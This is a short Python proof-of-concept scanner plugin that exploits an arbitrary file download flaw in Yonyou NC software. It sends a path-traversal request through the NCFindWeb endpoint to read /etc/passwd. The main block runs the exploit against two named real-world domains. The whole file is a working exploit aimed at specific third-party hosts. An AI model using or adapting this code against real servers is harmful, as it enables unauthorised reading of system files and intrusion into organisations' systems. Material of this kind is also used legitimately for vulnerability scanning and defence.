#!usr/bin/env python
# *-* coding:utf-8 *-*

"""
POC Name  :  用友nc NCFindWeb 任意文件下载
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148227

"""

def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg

def audit(arg):
    url = arg+'NCFindWeb?service=IPreAlertConfigService&filename=../../../../../etc/passwd'
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and "root" in res and "bin" in res:
        security_hole('yongyou_nc Arbitrary File Download')
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_nc', 'http://nc.cofco.com/')[1])
    audit(assign('yongyou_nc', 'http://nc.xhlbdc.com/')[1])